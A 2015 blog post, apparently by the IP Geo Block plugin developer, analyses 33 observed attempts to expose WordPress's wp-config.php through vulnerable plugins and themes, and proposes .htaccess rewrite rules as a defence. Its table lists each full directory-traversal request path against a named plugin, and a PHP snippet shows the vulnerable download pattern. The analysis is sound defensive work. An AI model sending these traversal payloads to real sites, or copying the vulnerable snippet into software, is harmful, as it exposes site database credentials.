---
layout: post
title:  "Prevent exposure of wp-config.php"
date:   2015-10-24 13:30:00
categories: article
published: true
script: []
inline:
---

From July to September, 33 types of malicious requests to attempt exposing the 
`wp-config.php` via vulnerable plugins and themes had been observed on my site.
I analyzed all of them to identify if [IP Geo Block][IP-Geo-Block] can block 
these or not.

<!--more-->

Unfortunately, I could not find all the causes of exposure because most of 
them were already removed from the WordPress repository. So I can't say the 
right thing with confidence, but the only 2 of these could be blocked by 
[IP Geo Block][IP-Geo-Block] even if they were from the forbidden countries.

In this article, I should clarify how to prevent exposure of `wp-config.php` 
against such malicous requests.

### <span id="sec1">Analysis of Attack Vectors</span> ###

Before showing the results, I'll show you the description of the terms same as 
in [this article][Analysis].

```text
Attack Vector = Type x Path
```

where:

- **Type**: The type of vulnerability that an attacker can abuse. For example, 
  XSS, SQLI, LFI and so on. Also it includes some certain parameters which 
  are generally called "signature".
- **Path**: The path to the entrance into WordPress where an attacker can 
  deliver the certain type of vulnerability.

The "**Path**" can be categorized into following : 

| Abbreviation of **Path** | Description           |
|:------------------------:|:----------------------|
| PD                       | **P**lugin **D**irect |
| WP                       | **W**ord **P**ress    |
| N/A                      | **N**ot **A**vailable |

Here's the table of 33 requests attempted to expose my `wp-config.php`. Most 
of them were disclosed recently. [IP Geo Block 2.1.5 and under][IP-Geo-Block] 
can protect the **Path** of <span class="label label-success">WP</span> while 
the <span class="label label-danger">PD</span> (and probably 
<span class="label label-warning">N/A</span>) are not because those never load 
the WordPress core.

<div class="table-responsive">
  <table id="my-table" class="table">
    <thead>
      <tr>
        <th>Disclosed</th>
        <th>Request</th>
        <th>Type</th>
        <th>Path</th>
      </tr>
    </thead>
    <tbody>
      <tr>
        <td>2015-08-10</td><!-- PD/NG -->
        <td><a href="https://www.exploit-db.com/exploits/37751/" title="WordPress WPTF Image Gallery 1.03 - Aribtrary File Download - Exploits Database">/wp-content/plugins/wptf-image-gallery/lib-mbox/ajax_load.php?url=../../../../wp-config.php</a></td>
        <td><abbr title="Aribtrary File Download">AFD</abbr></td>
        <td><span class="label label-danger">PD</span></td>
      </tr>
      <tr>
        <td>2015-07-16</td><!-- PD/NG https://github.com/wp-plugins/simple-image-manipulator -->
        <td><a href="http://www.vapid.dhs.org/advisory.php?v=147" title="Vulnerability">/wp-content/plugins/./simple-image-manipulator/controller/download.php?filepath=../../../../wp-config.php</a></td>
        <td><abbr title="Remote File Download">RFD</abbr></td>
        <td><span class="label label-danger">PD</span></td>
      </tr>
      <tr>
        <td>2015-07-12</td><!-- PD/NG https://github.com/wp-plugins/candidate-application-form -->
        <td><a href="https://wpvulndb.com/vulnerabilities/8099" title="Candidate Application Form &lt;= 1.0 - Arbitrary File Download">/wp-content/plugins/candidate-application-form/downloadpdffile.php?fileName=../../../wp-config.php</a></td>
        <td><abbr title="Arbitrary File Download">AFD</abbr></td>
        <td><span class="label label-danger">PD</span></td>
      </tr>
      <tr>
        <td>2015-07-09</td><!-- PD/NG https://wordpress.org/plugins/ibs-mappro/developers/ -->
        <td><a href="http://www.securityfocus.com/bid/75698" title="WordPress IBS Mappro Plugin 'download.php' Arbitrary File Download Vulnerability">/wp-content/plugins/ibs-mappro/lib/download.php?file=../../../../wp-config.php</a></td>
        <td><abbr title="Arbitrary File Download">AFD</abbr></td>
        <td><span class="label label-danger">PD</span></td>
      </tr>
      <tr>
        <td>2015-07-05</td><!-- PD/NG https://github.com/wp-plugins/image-export -->
        <td><a href="http://www.vapid.dhs.org/advisory.php?v=135" title="Vulnerabilit">/wp-content/plugins/image-export/download.php?file=../../../wp-config.php</a></td>
        <td><abbr title="Remote File Download">RFD</abbr></td>
        <td><span class="label label-danger">PD</span></td>
      </tr>
      <tr>
        <td>2015-07-05</td><!-- PD/NG https://wordpress.org/plugins/s3bubble-amazon-s3-html-5-video-with-adverts/developers/ -->
        <td><a href="https://www.exploit-db.com/exploits/37494/" title="WordPress S3Bubble Cloud Video With Adverts &amp; Analytics 0.7 - Arbitrary File Download - Exploits Database">/wp-content/plugins/s3bubble-amazon-s3-html-5-video-with-adverts/assets/plugins/ultimate/content/downloader.php?path=../../../../../../../wp-config.php</a></td>
        <td><abbr title="Arbitrary File Download">AFD</abbr></td>
        <td><span class="label label-danger">PD</span></td>
      </tr>
      <tr>
        <td>2015-07-05</td><!-- OK https://wordpress.org/plugins/wp-ecommerce-shop-styling/developers/ -->
        <td><a href="http://www.vapid.dhs.org/advisory.php?v=136" title="Vulnerabilit">/wp-content/plugins/wp-ecommerce-shop-styling/includes/download.php?filename=../../../../wp-config.php</a></td>
        <td><abbr title="Remote File Download">RFD</abbr></td>
        <td><span class="label label-success">WP</span></td>
      </tr>
      <tr>
        <td>2015-07-02</td><!-- OK https://github.com/wp-plugins/wp-swimteam/commit/3652df6c40d493cebb3e19f414edb0898d636bd5 -->
        <td><a href="http://www.vapid.dhs.org/advisory.php?v=134" title="Vulnerabilit">/wp-content/plugins/wp-swimteam/include/user/download.php?file=../../../../../wp-config.php&amp;filename=../../../../../wp-config.php&amp;contenttype=text/html&amp;transient=1&amp;abspath=/usr/share/wordpress</a></td>
        <td><abbr title="Remote File Download">RFD</abbr></td>
        <td><span class="label label-success">WP</span></td>
      </tr>
      <tr>
        <td>2015-06-10</td><!-- PD/NG https://github.com/wp-plugins/history-collection -->
        <td><a href="https://www.exploit-db.com/exploits/37254/" title="WordPress History Collection &lt;= 1.1.1 - Arbitrary File Download - Exploits Database">/wp-content/plugins/history-collection/download.php?var=../../../wp-config.php</a></td>
        <td><abbr title="Arbitrary File Download">AFD</abbr></td>
        <td><span class="label label-danger">PD</span></td>
      </tr>
      <tr>
        <td>2015-04-18</td><!-- N/A NG -->
        <td><a href="https://packetstormsecurity.com/files/131502/WordPress-WP-Mon-Arbitrary-File-Download.html" title="WordPress WP-Mon Arbitrary File Download - Packet Storm">/wp-content/plugins/wp-moN/Assets/download.php?type=octet/stream&amp;path=../../../../&amp;name=wp-config.php</a></td>
        <td><abbr title="Arbitrary File Download">AFD</abbr></td>
        <td><span class="label label-warning">N/A</span></td>
      </tr>
      <tr>
        <td>2015-04-13</td><!-- N/A -->
        <td><a href="https://www.exploit-db.com/exploits/36733/" title="WordPress Plugin 'WP Mobile Edition' 2.2.7 - Remote File Disclosure Vulnerability - Exploits Database">/wp-content/themes/mTheme-Unus/css/css.php?files=../../../../wp-config.php</a></td>
        <td><abbr title="Remote File Disclosure">RFD</abbr></td>
        <td><span class="label label-warning">N/A</span></td>
      </tr>
      <tr>
        <td>2015-03-26</td><!-- PD/NG https://github.com/wp-plugins/aspose-cloud-ebook-generator/commit/1c51e382fed7f3025fbe4469a729fd0aea7a1231 -->
        <td><a href="https://packetstormsecurity.com/files/131040/WordPress-Aspose-Cloud-eBook-Generator-File-Download.html" title="WordPress Aspose Cloud eBook Generator File Download - Packet Storm">/wp-content/plugins/aspose-cloud-ebook-generator/aspose_posts_exporter_download.php?file=../../../wp-config.php</a></td>
        <td><abbr title="Arbitrary File Download">AFD</abbr></td>
        <td><span class="label label-danger">PD</span></td>
      </tr>
      <tr>
        <td>2015-02-16</td><!-- N/A -->
        <td><a href="http://milw00rm.org/exploits/7497" title="Wordpress Justified Image Grid 2.0.1 - Multiple (LFD/XSS) Vulnerabilities">/wp-content/plugins/justified-image-grid/download.php?file=file:///var/www/wp-config.php</a></td>
        <td><abbr title="Local File Disclosure">LFD</abbr></td>
        <td><span class="label label-warning">N/A</span></td>
      </tr>
      <tr>
        <td>2014-12-24</td><!-- N/A -->
        <td><a href="https://packetstormsecurity.com/files/129706/WordPress-Themes-download.php-File-Disclosure.html" title="WordPress Themes download.php File Disclosure - Packet Storm">/wp-content/themes/markant/download.php?file=../../wp-config.php</a></td>
        <td><abbr title="Arbitrary File Download">AFD</abbr></td>
        <td><span class="label label-warning">N/A</span></td>
      </tr>
      <tr>
        <td>2014-12-24</td><!-- N/A -->
        <td><a href="https://packetstormsecurity.com/files/129706/WordPress-Themes-download.php-File-Disclosure.html" title="WordPress Themes download.php File Disclosure - Packet Storm">/wp-content/themes/MichaelCanthony/download.php?file=../../../wp-config.php</a></td>
        <td><abbr title="Arbitrary File Download">AFD</abbr></td>
        <td><span class="label label-warning">N/A</span></td>
      </tr>
      <tr>
        <td>2014-12-24</td><!-- N/A -->
        <td><a href="https://packetstormsecurity.com/files/129706/WordPress-Themes-download.php-File-Disclosure.html" title="WordPress Themes download.php File Disclosure - Packet Storm">/wp-content/themes/felis/download.php?file=../wp-config.php</a></td>
        <td><abbr title="Arbitrary File Download">AFD</abbr></td>
        <td><span class="label label-warning">N/A</span></td>
      </tr>
      <tr>
        <td>2014-12-24</td><!-- N/A -->
        <td><a href="https://packetstormsecurity.com/files/129706/WordPress-Themes-download.php-File-Disclosure.html" title="WordPress Themes download.php File Disclosure - Packet Storm">/wp-content/themes/SMWF/inc/download.php?file=../wp-config.php</a></td>
        <td><abbr title="Arbitrary File Download">AFD</abbr></td>
        <td><span class="label label-warning">N/A</span></td>
      </tr>
      <tr>
        <td>2014-12-24</td><!-- N/A -->
        <td><a href="https://packetstormsecurity.com/files/129706/WordPress-Themes-download.php-File-Disclosure.html" title="WordPress Themes download.php File Disclosure - Packet Storm">/wp-content/themes/TheLoft/download.php?file=../../../wp-config.php</a></td>
        <td><abbr title="Arbitrary File Download">AFD</abbr></td>
        <td><span class="label label-warning">N/A</span></td>
      </tr>
      <tr>
        <td>2014-12-24</td><!-- N/A -->
        <td><a href="https://packetstormsecurity.com/files/129706/WordPress-Themes-download.php-File-Disclosure.html" title="WordPress Themes download.php File Disclosure - Packet Storm">/wp-content/themes/trinity/lib/scripts/download.php?file=../../../../../wp-config.php</a></td>
        <td><abbr title="Arbitrary File Download">AFD</abbr></td>
        <td><span class="label label-warning">N/A</span></td>
      </tr>
      <tr>
        <td>2014-12-24</td><!-- N/A -->
        <td><a href="https://packetstormsecurity.com/files/129706/WordPress-Themes-download.php-File-Disclosure.html" title="WordPress Themes download.php File Disclosure - Packet Storm">/wp-content/themes/urbancity/lib/scripts/download.php?file=../../../../../wp-config.php</a></td>
        <td><abbr title="Arbitrary File Download">AFD</abbr></td>
        <td><span class="label label-warning">N/A</span></td>
      </tr>
      <tr>
        <td>2014-12-24</td><!-- N/A -->
        <td><a href="https://packetstormsecurity.com/files/129706/WordPress-Themes-download.php-File-Disclosure.html" title="WordPress Themes download.php File Disclosure - Packet Storm">/wp-content/themes/yakimabait/download.php?file=./wp-config.php</a></td>
        <td><abbr title="Arbitrary File Download">AFD</abbr></td>
        <td><span class="label label-warning">N/A</span></td>
      </tr>
      <tr>
        <td>2014-12-07</td><!-- N/A -->
        <td><a href="https://wpvulndb.com/vulnerabilities/7710" title="ChurcHope Theme Local File Inclusion (LFI)">/wp-content/themes/churchope/lib/downloadlink.php?file=../../../../wp-config.php</a></td>
        <td><abbr title="Local File Inclusion">LFI</abbr></td>
        <td><span class="label label-warning">N/A</span></td>
      </tr>
      <tr>
        <td>2014-12-06</td><!-- N/A -->
        <td><a href="http://www.homelab.it/index.php/2014/12/06/wordpress-ajax-store-locator-arbitrary-file-download-vulnerability/" title="Wordpress Ajax Store Locator Arbitrary File Download Vulnerability">/wp-content/plugins/ajax-store-locator-wordpress_0/sl_file_download.php?download_file=../../../wp-config.php</a></td>
        <td><abbr title="Arbitrary File Download">AFD</abbr></td>
        <td><span class="label label-warning">N/A</span></td>
      </tr>
      <tr>
        <td>2014-09-09</td><!-- PD/NG https://github.com/wp-plugins/wp-support-plus-responsive-ticket-system/commit/42d48000a489206243beaabfe798d02d411bd330#diff-29 -->
        <td><a href="https://www.exploit-db.com/exploits/34589/" title="WordPress WP Support Plus Responsive Ticket System 2.0 Plugin - Multiple Vulnerabilities - Exploits Database">/wp-content/plugins/wp-support-plus-responsive-ticket-system/includes/admin/downloadAttachment.php?path=../../../../../wp-config.php</a></td>
        <td><abbr title="Arbitrary File Download">AFD</abbr></td>
        <td><span class="label label-danger">PD</span></td>
      </tr>
      <tr>
        <td>2014-09-08</td><!-- N/A -->
        <td><a href="https://www.exploit-db.com/exploits/34578/" title="WordPress Acento Theme view-pdf.php file param - Arbitrary File Download - Exploits Database">/wp-content/themes/acento/includes/view-pdf.php?download=1&amp;file=/path/wp-config.php</a></td>
        <td><abbr title="Arbitrary File Download">AFD</abbr></td>
        <td><span class="label label-warning">N/A</span></td>
      </tr>
      <tr>
        <td>2014-09-08</td><!-- N/A -->
        <td><a href="https://packetstormsecurity.com/files/128188/WordPress-Antioch-Arbitrary-File-Download.html" title="WordPress Antioch Arbitrary File Download - Packet Storm">/wp-content/themes/antioch/lib/scripts/download.php?file=../../../../../wp-config.php</a></td>
        <td><abbr title="Arbitrary File Download">AFD</abbr></td>
        <td><span class="label label-warning">N/A</span></td>
      </tr>
      <tr>
        <td>2014-09-07</td><!-- N/A -->
        <td><a href="https://cxsecurity.com/issue/WLB-2014090037" title="Wordpress Authentic Theme Arbitrary File Download Vulnerability - CXSecurity.com">/wp-content/themes/authentic/includes/download.php?file=../../../../wp-config.php</a></td>
        <td><abbr title="Arbitrary File Download">AFD</abbr></td>
        <td><span class="label label-warning">N/A</span></td>
      </tr>
      <tr>
        <td>2014-09-07</td><!-- N/A http://www.organizedthemes.com/themes/epic/ -->
        <td><a href="http://cxsecurity.com/issue/WLB-2014090036" title="Wordpress epic theme Arbitrary File Download Vulnerability - CXSecurity.com">/wp-content/themes/epic/includes/download.php?file=wp-config.php</a></td>
        <td><abbr title="Arbitrary File Download">AFD</abbr></td>
        <td><span class="label label-warning">N/A</span></td>
      </tr>
      <tr>
        <td>2014-09-03</td><!-- N/A NG -->
        <td><a href="https://blog.sucuri.net/2014/09/slider-revolution-plugin-critical-vulnerability-being-exploited.html" title="Slider Revolution Plugin Critical Vulnerability Being Exploited - Sucuri Blog">/wp-admiN/Admin-ajax.php?action=revslider_show_image&amp;img=../wp-config.php</a></td>
        <td><abbr title="Local File Inclusion">LFI</abbr></td>
        <td><span class="label label-warning">N/A</span></td>
      </tr>
      <tr>
        <td>2014-04-14</td><!-- N/A -->
        <td><a href="https://www.exploit-db.com/exploits/32861/" title="WordPress Theme LineNity 1.20 - Local File Inclusion - Exploits Database">/wp-content/themes/linenity/functions/download.php?imgurl=../../../../wp-config.php</a></td>
        <td><abbr title="Local File Inclusion">LFI</abbr></td>
        <td><span class="label label-warning">N/A</span></td>
      </tr>
      <tr>
        <td>2014-08-31</td><!-- N/A -->
        <td><a href="https://packetstormsecurity.com/files/128101/WordPress-NativeChurch-lote27-FR0_theme-acento-File-Download.html" title="WordPress NativeChurch / lote27 / FR0_theme / acento File Download - Packet Storm">/wp-content/themes/lote27/download.php?download=../../../wp-config.php</a></td>
        <td><abbr title="Arbitrary File Download">AFD</abbr></td>
        <td><span class="label label-warning">N/A</span></td>
      </tr>
      <tr>
        <td>2014-08-01</td><!-- https://github.com/wp-plugins/contus-video-gallery/releases -->
        <td><a href="https://wpvulndb.com/plugins/contus-video-gallery" title="WordPress Plugin: contus-video-gallery">/wp-content/plugins/contus-video-gallery/hdflvplayer/download.php?f=../../../../wp-config.php</a></td>
        <td><abbr title="Arbitrary File Download">AFD</abbr></td>
        <td><span class="label label-danger">PD</span></td>
      </tr>
      <tr>
        <td>2011-09-19</td><!-- N/A http://plugins.svn.wordpress.org/filedownload/ -->
        <td><a href="https://www.exploit-db.com/exploits/17858/" title="WordPress Filedownload Plugin 0.1 - download.php Remote File Disclosure Vulnerability - Exploits Database">/wp-content/plugins/filedownload/download.php?path=../../../wp-config.php&amp;type=aplication/pdf</a></td>
        <td><abbr title="Remote File Disclosure">RFD</abbr></td>
        <td><span class="label label-warning">N/A</span></td>
      </tr>
    </tbody>
  </table>
</div>

### <span id="sec2">What's the cause?</span> ###

As you can see, most of them had their own download function like 
`download.php`. Typical OMG <span class="emoji">
![emoji](https://assets-cdn.github.com/images/icons/emoji/unicode/1f631.png)
</span> code in there are like following :

{% highlight php %}
<?php
$file = $_GET['file'];
if (file_exists('../../uploads/xxxx/'.$file)) {
    readfile('../../uploads/xxxx/'.$file);
    exit();
}
?>
{% endhighlight %}

This kind of vulnerability is caused by [Directory Traversal][OWASP] attack.

### <span id="sec3">How to protect my site against such OMG code?</span> ###

First and foremost, we should consider to make the **Path** transformed from 
<span class="label label-danger">PD</span> to
<span class="label label-success">WP</span>. If those code have a chance to 
load `wp-load.php` before they were excuted, [IP Geo Block][IP-Geo-Block] can 
block the attacks.

To achieve this, please consider to put the following directives into the 
`.htaccess` in your plugins directory for example :

{% highlight text %}
# BEGIN IP Geo Block
<IfModule mod_rewrite.c>
RewriteEngine on
RewriteBase /wp-content/plugins/ip-geo-block/
RewriteCond %{REQUEST_URI} !ip-geo-block/rewrite.php$
RewriteRule ^.*\.php$ rewrite.php [L]
</IfModule>
# END IP Geo Block
{% endhighlight %}

The absolute path of `/wp-content/plugins/` should be changed according to 
your site configuration. And here's the example in themes directory :

{% highlight text %}
# BEGIN IP Geo Block
<IfModule mod_rewrite.c>
RewriteEngine on
RewriteBase /wp-content/plugins/ip-geo-block/
RewriteRule ^.*\.php$ rewrite.php [L]
</IfModule>
# END IP Geo Block
{% endhighlight %}

Those will redirect a request, which is pointed to 
`/wp-content/plugins/.../*.php` or to 
`/wp-content/themes/.../*.php`, to the [rewrite.php][WritePHP] in 
[IP Geo Block][IP-Geo-Block] in order to load `wp-load.php` and then it will 
be validated by country code or WP-ZEP <span class="emoji">
![emoji](https://assets-cdn.github.com/images/icons/emoji/unicode/1f4aa.png)
</span>.

Another consideration for **Type** in **Attack Vector** is that 
[IP Geo Block][IP-Geo-Block] should filter out the "**Malicious signature**" 
such as `wp-config.php` or `passwd` to defence against attacks from the 
permitted countries.

I'll provide you this functionarity in the next release (may be 2.2.0) !! 
<span class="emoji">
![emoji](https://assets-cdn.github.com/images/icons/emoji/unicode/1f63c.png)
</span>

[IP-Geo-Block]: https://wordpress.org/plugins/ip-geo-block/ "WordPress › IP Geo Block « WordPress Plugins"
[Analysis]:     {{ "/article/analysis-attack-vector.html" | prepend: site.baseurl }} "Analysis of Attack Vector against WP Plugins"
[OWASP]:        https://www.owasp.org/index.php/Path_Traversal "Path Traversal - OWASP"
[WritePHP]:     https://github.com/tokkonopapa/WordPress-IP-Geo-Block/blob/master/ip-geo-block/rewrite.php "WordPress-IP-Geo-Block/rewrite.php at master - tokkonopapa/WordPress-IP-Geo-Block"
